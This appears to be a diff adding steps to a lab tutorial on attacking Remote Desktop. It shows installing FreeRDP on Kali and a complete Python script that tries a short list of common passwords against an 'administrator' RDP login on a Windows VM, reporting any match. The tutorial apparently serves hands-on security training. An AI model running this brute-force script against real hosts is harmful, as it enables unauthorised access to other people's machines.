@@ -53,3 +53,59 @@ Run the following command as **Administrator** in CMD:
 
 ```bash
 netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
+
+🐍 Running the Python Script
+Step 5: Install FreeRDP on Kali
+'''bash
+sudo apt update
+sudo apt install freerdp2-x11
+Step 6: Write the Brute-Force Script
+Create the file:
+
+'''bash
+nano rdp_brute.py
+Paste the following code:
+
+python
+import subprocess
+
+target_ip = "192.168.56.102"  # Change to your Windows VM IP
+username = "administrator"    # Change to your Windows user
+
+passwords = [
+    "123456", "admin", "administrator", "password",    
+    "admin123", "test123", "welcome", "qwerty", "1234", "56789"
+]
+
+print(f"[*] Starting brute-force on {target_ip} with username '{username}'...\n")
+
+for attempt, password in enumerate(passwords, 1):
+    print(f"[{attempt}/10] Trying password: {password}")
+    try:
+        result = subprocess.run(
+            ["xfreerdp", f"/v:{target_ip}", f"/u:{username}", f"/p:{password}", "/cert:ignore"],
+            capture_output=True, text=True, timeout=10
+        )
+
+        if "Authentication only, exit status 0" in result.stderr or result.returncode == 0:
+            print(f"\n[+] SUCCESS! Password found: {password}")
+            break
+        else:
+            print("[-] Failed.")
+    except subprocess.TimeoutExpired:
+        print("[!] Timeout, skipping...")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+else:
+    print("\n[-] Tried all 10 passwords. No match found.")
+Save and exit:
+
+Press Ctrl + O, then Enter
+
+Press Ctrl + X to exit nano
+
+Step 7: Run the Script
+'''bash
+
+python3 rdp_brute.py
+You’ll see it try each password and print either "Success" or "Failed"
